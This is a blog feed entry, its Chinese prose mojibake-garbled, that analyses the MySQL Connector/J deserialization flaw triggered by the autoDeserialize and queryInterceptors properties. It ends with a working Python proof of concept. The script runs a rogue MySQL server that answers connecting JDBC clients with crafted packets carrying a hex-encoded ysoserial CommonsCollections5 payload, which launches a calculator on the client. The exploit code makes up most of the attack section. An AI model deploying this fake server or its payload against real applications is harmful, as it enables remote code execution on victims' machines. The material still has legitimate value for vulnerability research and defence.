    <content type="html"><![CDATA[<p>Âú® <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-jdbc-url-format.html" target="_blank" rel="noopener">JDBC URL ËØ≠Ê≥ï</a>‰∏≠ÔºåÊòØÂèØ‰ª•Á±ª‰ºº‰∫é get ËÆæÁΩÆËØ∑Ê±Ç<a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html" target="_blank" rel="noopener">Â±ûÊÄß</a>ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792595186616.jpg" alt="-w283"></p><p>Âú®ËøôÈáåÊúâ‰∏§‰∏™ÂΩ±ÂìçÊ≠§ÊºèÊ¥ûÁöÑÂÖ≥ÈîÆÂ±ûÊÄß</p><table><thead><tr><th>Properties</th><th>Descriptions</th></tr></thead><tbody><tr><td>autoDeserialize</td><td>Should the driver automatically detect and de-serialize objects stored in BLOB fields?<br><br>Default: false<br><br>Since version: 3.1.5</td></tr><tr><td>queryInterceptors</td><td>A comma-delimited list of classes that implement ‚Äúcom.mysql.cj.interceptors.QueryInterceptor‚Äù that should be placed ‚Äúin between‚Äù query execution to influence the results. QueryInterceptors are ‚Äúchainable‚Äù, the results returned by the ‚Äúcurrent‚Äù interceptor will be passed on to the next in in the chain, from left-to-right order, as specified in this property.<br><br>Since version: 8.0.7</td></tr></tbody></table><p>ÁÆÄÂçïÂú∞ËØ¥Ôºö</p><ul><li><code>queryInterceptors</code>Âú®ÊâßË°åÊü•ËØ¢ÂâçËøõË°åÊã¶Êà™Âπ∂Â§ÑÁêÜ</li><li><code>autoDeserialize</code>Âú®ÈÅáÂà∞ blob Á±ªÂûã‰ºöÊâßË°åÂèçÂ∫èÂàóÂåñ</li></ul><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>ÈÄöËøáÁÆÄÂçïÁöÑË∞ÉËØïÔºåÂèØ‰ª•ÁúãÂà∞Âú®ServerStatusDiffInterceptor Êã¶Êà™Âô®ËøõË°åÈ¢ÑÂ§ÑÁêÜÊó∂Ôºå‰ºöÊü•ËØ¢ÊúçÂä°Âô® session Áä∂ÊÄÅ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792599910076.jpg" alt="-w1031"></p><p>‰πãÂêéÂàÜÂà´ËØªÂèñ key Âíå value Â≠òÊîæÂà∞ map ‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792600601748.jpg" alt="-w1078"></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂΩìÊï∞ÊçÆÁ±ªÂûã‰∏∫ BLOB Êó∂Ôºå‰∏î autoDeserialize ÂºÄÂêØÊÉÖÂÜµ‰∏ãÔºåÂ∞±‰ºöËØªÂèñÊï∞ÊçÆÊµÅÂπ∂ÊâßË°åÂèçÂ∫èÂàóÂåñ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15788858814632.jpg" alt="-w1502"></p><p>Ë∑üÂÖ•ÂÆûÈôÖÊµÅÁ®ãÔºåÂèëÁé∞‰ºöÂÖàÂêéËß¶Âèë preProcess ‰ª•Âèä postProcessÔºåÊâÄ‰ª•‰ºöËØ∑Ê±Ç‚ÄùSHOW SESSION STATUS‚Äù‰∏§Ê¨°</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792610322507.jpg" alt="-w813"></p><p>ÈÇ£‰πàËß¶ÂèëÊù°‰ª∂Â∞±ÊòØÂ§çÂÜô<code>show session status</code>ÔºåÂú® mysql ‰∏≠Êúâ‰∏Ä‰∏™Êèí‰ª∂Âè´ÂÅö<code>rewrite</code>ÔºåÂú®5.7.6ÂºÄÂßãÊîØÊåÅ<code>Query Rewrite</code>,ËÉΩÂ§üÂ∞ÜÁ¨¶ÂêàÂØπÂ∫îpatternÁöÑSQLËØ≠Âè•ËøõË°åÈáçÂÜô</p><p>‰ΩÜÂÆûÈôÖ‰∏äÔºåÁî±‰∫éÁõÆÊ†áËØ≠Âè•ÁöÑÁâπÊÆäÊÄßÔºåÊòØÊ≤°ÊúâÂäûÊ≥ïÈáçÂÜôÁöÑ</p><pre class=" language-shell"><code class="language-shell">mysql> insert into query_rewrite.rewrite_rules (pattern, replacement) values ('show session status', 'select 1,2');Query OK, 1 row affected (0.00 sec)mysql> call query_rewrite.flush_rewrite_rules();ERROR 1644 (45000): Loading of some rule(s) failed.</code></pre><p>‰∏§ÁßçËß£ÂÜ≥ÂäûÊ≥ï</p><ol><li>ÁºñËØërewrite_exampleÊèí‰ª∂ÔºåÂÖ∑‰ΩìÂèØËßÅ<a href="https://xz.aliyun.com/t/7067" target="_blank" rel="noopener">Ê≠§ÊñáÁ´†</a></li><li>‰º™Ë£Ö MysqlÔºåËá™ÂÆö‰πâÊï∞ÊçÆÊµÅÈáè</li></ol><p>ÂêéËÄÖÂú®ÂÜÖÁΩëÊ≤°ÊúâÂèØÊéß mysql ÊÉÖÂÜµ‰∏ã‰ºöÂæàÂ•ΩÁî®ÔºåÊØïÁ´üÂâçËÄÖÂä®‰ΩúÂ§™Â§ß‰∫ÜËøòË¶Å‰∏¥Êó∂ÁºñËØë</p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><p>ÊµãËØïÊü•ÁúãÊµÅÈáèÊó∂ÂÄôÈúÄË¶ÅÂºÄÂêØ<code>useSSL=false</code>ÔºåÂê¶ÂàôÊòØÂä†ÂØÜÁöÑÊï∞ÊçÆÂåÖ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15791829419663.jpg" alt="-w1896"></p><p>ÂΩìÁÑ∂‰πüÂèØ‰ª•‰ΩøÁî® socket + ssl ‰º™Ë£Ö mysql ÊúçÂä°Á´Ø(ÊáíÂæóÂÜô==Ê≤°ËØïËøá)</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding : utf-8</span><span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">return_little_endian</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">return_hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    hex_s <span class="token operator">=</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> return_little_endian<span class="token punctuation">(</span><span class="token string">'0'</span> <span class="token operator">+</span> hex_s <span class="token keyword">if</span> len<span class="token punctuation">(</span>hex_s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token keyword">else</span> hex_s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">return_len_hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> return_little_endian<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># java -jar ysoserial-master.jar CommonsCollections5 "/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>payload <span class="token operator">=</span> <span class="token string">'ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000037372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000005374002679736F73657269616C2E7061796C6F6164732E436F6D6D6F6E73436F6C6C656374696F6E7335740018436F6D6D6F6E73436F6C6C656374696F6E73352E6A6176617400096765744F626A6563747371007E000B0000003571007E000D71007E000E71007E000F7371007E000B0000002274001979736F73657269616C2E47656E65726174655061796C6F616474001447656E65726174655061796C6F61642E6A6176617400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E001A78737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B657971007E00014C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00017870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00055B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E003200000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E00327371007E002B7571007E002F00000002707571007E002F00000000740006696E766F6B657571007E003200000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E002F7371007E002B757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000000174003D2F53797374656D2F4170706C69636174696F6E732F43616C63756C61746F722E6170702F436F6E74656E74732F4D61634F532F43616C63756C61746F72740004657865637571007E00320000000171007E00377371007E0027737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000000770800000010000000007878'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'4a0000000a352e372e3235000a00000041787403090e1e2500ffff080200ffc11500000000000000000000501d1d2e606244016f3f0e65006d7973716c5f6e61746976655f70617373776f726400'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0700000200000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'01000001152e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002800000f0364656600000012706572666f726d616e63655f736368656d61000c3f000100000008800000000026000010036465660000001071756572795f63616368655f73697a65000c3f001500000008a00000000026000011036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000012036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000013036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000014036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001503646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000016036465660000000c776169745f74696d656f7574000c3f001500000008a0000000000d0100170131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f63690f757466385f67656e6572616c5f6369000532383830300347504c01300831363737373231360236300131083136373737323136034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e034353540653595354454d0f52455045415441424c452d5245414405323838303007000018fe000002000200'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0700000100000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0700000100000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0100000102320000020364656604746573740a6a64626361747461636b0a6a64626361747461636b0269640269640c3f000b0000000300000000003c0000030364656604746573740a6a64626361747461636b0a6a64626361747461636b07636f6d6d616e6407636f6d6d616e640c3f00ffff0000fc9000000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'04'</span> <span class="token operator">+</span> <span class="token string">'0131fc'</span> <span class="token operator">+</span> return_hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">+</span> payloaddata_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> return_len_hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp <span class="token operator">+</span> <span class="token string">'05000006fe00002200'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>HOST <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>PORT <span class="token operator">=</span> <span class="token number">3306</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn <span class="token operator">=</span> None<span class="token keyword">print</span> <span class="token string">'Server start at: %s:%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'wait for connection...'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> conn <span class="token keyword">is</span> None<span class="token punctuation">:</span>            conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'[+] Connected From'</span><span class="token punctuation">,</span> addr            <span class="token keyword">for</span> i <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>                conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"[-] Transfer End"</span>            <span class="token keyword">print</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            conn <span class="token operator">=</span> None    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># print('waiting...')</span>        conn <span class="token operator">=</span> None</code></pre><h3 id="ÊïàÊûú"><a href="#ÊïàÊûú" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/2020-01-17%2017.21.30.gif" alt="2020-01-17 17.21.30"></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf" target="_blank" rel="noopener">New Exploit Technique In Java Deserialization Attack</a></li><li><a href="https://xz.aliyun.com/t/7067" target="_blank" rel="noopener">mysql jdbc ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊµãËØï</a></li><li><a href="http://www.fordba.com/mysql-query-rewrite-plugin-test.html" target="_blank" rel="noopener">MySQL Query Rewrite Plugin ÁÆÄÂçï‰ΩøÁî®ÊµãËØï</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‰º™Ë£Ö Mysql ÁúüÊúâË∂£&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Mysql" scheme="https://blog.sari3l.com/tags/Mysql/"/>
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
</feed>
